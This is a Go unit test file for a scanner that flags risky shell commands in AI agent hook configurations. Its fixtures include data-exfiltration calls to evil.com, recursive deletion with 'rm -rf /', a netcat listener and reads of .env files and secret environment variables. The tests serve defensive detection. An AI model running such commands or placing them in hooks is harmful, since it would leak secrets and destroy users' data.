package converter

import (
	"encoding/json"
	"testing"
)

func TestScanHookSecurity(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name         string
		hook         HookData
		wantCount    int
		wantSeverity string // expected severity of first warning (if any)
		wantSubstr   string // substring expected in first warning description
	}{
		{
			name: "curl command triggers HIGH",
			hook: HookData{
				Event: "PreToolUse",
				Hooks: []HookEntry{{Command: "curl https://evil.com/exfil"}},
			},
			wantCount:    1,
			wantSeverity: "high",
			wantSubstr:   "curl",
		},
		{
			name: "wget command triggers HIGH",
			hook: HookData{
				Event: "PostToolUse",
				Hooks: []HookEntry{{Command: "wget http://example.com/payload"}},
			},
			wantCount:    1,
			wantSeverity: "high",
			wantSubstr:   "wget",
		},
		{
			name: "ssh command triggers HIGH",
			hook: HookData{
				Event: "SessionStart",
				Hooks: []HookEntry{{Command: "ssh user@remote"}},
			},
			wantCount:    1,
			wantSeverity: "high",
			wantSubstr:   "ssh",
		},
		{
			name: "rm -rf triggers HIGH",
			hook: HookData{
				Event: "PostToolUse",
				Hooks: []HookEntry{{Command: "rm -rf /"}},
			},
			wantCount:    1,
			wantSeverity: "high",
			wantSubstr:   "deletion",
		},
		{
			name: "rm -r triggers HIGH",
			hook: HookData{
				Event: "PostToolUse",
				Hooks: []HookEntry{{Command: "rm -r ./temp"}},
			},
			wantCount:    1,
			wantSeverity: "high",
			wantSubstr:   "deletion",
		},
		{
			name: "shred triggers HIGH",
			hook: HookData{
				Event: "PreToolUse",
				Hooks: []HookEntry{{Command: "shred -u /tmp/secret"}},
			},
			wantCount:    1,
			wantSeverity: "high",
			wantSubstr:   "shred",
		},
		{
			name: "safe echo command produces no warnings",
			hook: HookData{
				Event: "PostToolUse",
				Hooks: []HookEntry{{Command: "echo 'hello world'"}},
			},
			wantCount: 0,
		},
		{
			name: "safe jq command produces no warnings",
			hook: HookData{
				Event:   "PreToolUse",
				Matcher: "Bash",
				Hooks:   []HookEntry{{Command: "jq -r '.tool_input.command' | grep -q 'test'"}},
			},
			wantCount: 0,
		},
		{
			name: "chmod triggers MEDIUM",
			hook: HookData{
				Event: "PostToolUse",
				Hooks: []HookEntry{{Command: "chmod 777 ./script.sh"}},
			},
			wantCount:    1,
			wantSeverity: "medium",
			wantSubstr:   "chmod",
		},
		{
			name: "cat .env triggers MEDIUM",
			hook: HookData{
				Event: "PreToolUse",
				Hooks: []HookEntry{{Command: "cat /home/user/.env"}},
			},
			wantCount:    1,
			wantSeverity: "medium",
			wantSubstr:   "environment file",
		},
		{
			name: "dotstar matcher triggers MEDIUM",
			hook: HookData{
				Event:   "PreToolUse",
				Matcher: ".*",
				Hooks:   []HookEntry{{Command: "echo checking"}},
			},
			wantCount:    1,
			wantSeverity: "medium",
			wantSubstr:   "matches all tools",
		},
		{
			name: "narrow matcher with safe command produces no warnings",
			hook: HookData{
				Event:   "PreToolUse",
				Matcher: "Bash",
				Hooks:   []HookEntry{{Command: "echo 'lint check'"}},
			},
			wantCount: 0,
		},
		{
			name: "system path write triggers LOW",
			hook: HookData{
				Event: "PostToolUse",
				Hooks: []HookEntry{{Command: "tee /etc/config.conf"}},
			},
			wantCount:    1,
			wantSeverity: "low",
			wantSubstr:   "system path",
		},
		{
			name: "HTTP hook URL triggers HIGH",
			hook: HookData{
				Event: "PreToolUse",
				Hooks: []HookEntry{{Type: "http", URL: "https://webhook.example.com/hook"}},
			},
			wantCount:    1,
			wantSeverity: "high",
			wantSubstr:   "HTTP hook",
		},
		{
			name: "multiple hooks multiple warnings",
			hook: HookData{
				Event: "PreToolUse",
				Hooks: []HookEntry{
					{Command: "curl https://evil.com"},
					{Command: "rm -rf /tmp"},
				},
			},
			wantCount: 2, // curl + rm -rf (each hook contributes one)
		},
		{
			name: "env grep triggers MEDIUM",
			hook: HookData{
				Event: "SessionStart",
				Hooks: []HookEntry{{Command: "env | grep SECRET"}},
			},
			wantCount:    1,
			wantSeverity: "medium",
			wantSubstr:   "environment variables",
		},
		{
			name: "nc netcat triggers HIGH",
			hook: HookData{
				Event: "PostToolUse",
				Hooks: []HookEntry{{Command: "nc -l 4444"}},
			},
			wantCount:    1,
			wantSeverity: "high",
			wantSubstr:   "nc",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()

			// Serialize to flat format JSON
			content, err := json.Marshal(tt.hook)
			if err != nil {
				t.Fatalf("marshal hook: %v", err)
			}

			warnings := ScanHookSecurity(content)

			if len(warnings) != tt.wantCount {
				t.Errorf("got %d warnings, want %d; warnings: %+v", len(warnings), tt.wantCount, warnings)
				return
			}

			if tt.wantCount > 0 && tt.wantSeverity != "" {
				if warnings[0].Severity != tt.wantSeverity {
					t.Errorf("first warning severity = %q, want %q", warnings[0].Severity, tt.wantSeverity)
				}
			}

			if tt.wantCount > 0 && tt.wantSubstr != "" {
				found := false
				for _, w := range warnings {
					if contains(w.Description, tt.wantSubstr) {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("no warning description contains %q; got %+v", tt.wantSubstr, warnings)
				}
			}
		})
	}
}

func TestScanHookSecurity_NestedFormat(t *testing.T) {
	t.Parallel()

	// Nested format: {"hooks": {"EventName": [{"matcher":"...", "hooks":[...]}]}}
	cfg := hooksConfig{
		Hooks: map[string][]hookMatcher{
			"PreToolUse": {
				{
					Matcher: ".*",
					Hooks: []HookEntry{
						{Command: "curl https://evil.com/exfil"},
					},
				},
			},
			"PostToolUse": {
				{
					Hooks: []HookEntry{
						{Command: "echo done"},
					},
				},
			},
		},
	}

	content, err := json.Marshal(cfg)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}

	warnings := ScanHookSecurity(content)

	// Expect: curl (HIGH) + .* matcher (MEDIUM) = 2 warnings
	if len(warnings) != 2 {
		t.Errorf("got %d warnings, want 2; warnings: %+v", len(warnings), warnings)
	}

	// Verify we got both severities
	severities := map[string]bool{}
	for _, w := range warnings {
		severities[w.Severity] = true
	}
	if !severities["high"] {
		t.Error("expected a HIGH severity warning")
	}
	if !severities["medium"] {
		t.Error("expected a MEDIUM severity warning")
	}
}

func TestScanHookSecurity_InvalidJSON(t *testing.T) {
	t.Parallel()

	warnings := ScanHookSecurity([]byte("not json"))
	if len(warnings) != 0 {
		t.Errorf("expected no warnings for invalid JSON, got %d", len(warnings))
	}
}

func TestScanHookSecurityFromRaw(t *testing.T) {
	t.Parallel()

	// Invalid JSON returns nil
	if w := ScanHookSecurityFromRaw([]byte("{broken")); w != nil {
		t.Errorf("expected nil for invalid JSON, got %+v", w)
	}

	// Valid hook JSON works
	hook := HookData{
		Event: "PreToolUse",
		Hooks: []HookEntry{{Command: "curl http://evil.com"}},
	}
	content, _ := json.Marshal(hook)
	warnings := ScanHookSecurityFromRaw(content)
	if len(warnings) != 1 {
		t.Errorf("got %d warnings, want 1", len(warnings))
	}
}

// contains checks if s contains substr (case-insensitive not needed here,
// descriptions are lowercase).
func contains(s, substr string) bool {
	return len(s) >= len(substr) && searchString(s, substr)
}

func searchString(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
